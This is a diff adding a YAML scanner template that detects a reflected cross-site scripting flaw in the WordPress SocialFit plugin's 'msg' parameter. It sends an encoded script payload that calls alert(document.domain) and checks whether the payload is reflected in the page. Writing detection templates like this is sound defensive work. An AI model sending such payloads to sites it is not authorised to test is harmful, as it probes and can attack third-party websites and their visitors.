@@ -1,0 +1,38 @@
+id: wp-socialfit-xss
+brief:
+    title: WordPress SocialFit - Cross-Site Scripting
+    by: daffainfo
+    level: high
+    about: WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input.
+    label:
+        - wordpress
+        - wp
+        - xss
+        - wp-plugin
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - <title>Google+
+            - window.___gcfg
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
